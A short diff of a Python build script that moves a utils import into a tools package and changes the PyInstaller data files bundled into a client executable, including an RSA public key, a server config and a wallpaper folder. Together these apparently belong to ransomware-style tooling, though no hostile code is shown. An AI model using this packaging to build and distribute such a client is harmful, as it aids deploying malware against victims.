@@ -6,7 +6,7 @@ import sys
 import time
 import configparser
 import argparse
-from utils import resource_path
+from tools.utils import resource_path
 from tqdm import tqdm
 from colorama import Fore, Style, init
 from cryptography.hazmat.primitives.asymmetric import rsa
@@ -83,8 +83,8 @@ def compile_executable():
         '--add-data', 'keys/public_key.pem:keys',
         '--add-data', 'server/config.ini:server',
         '--add-data', 'client:client',  # Inclure tout le répertoire client
-        '--add-data', 'utils.py:.',
-        '--add-data', 'new_wallpaper.jpg:.',
+        '--add-data', 'tools:tools',
+        '--add-data', 'wallpaper:wallpaper',
         'client/main.py'
     ],
     stdout=subprocess.PIPE, stderr=subprocess.PIPE
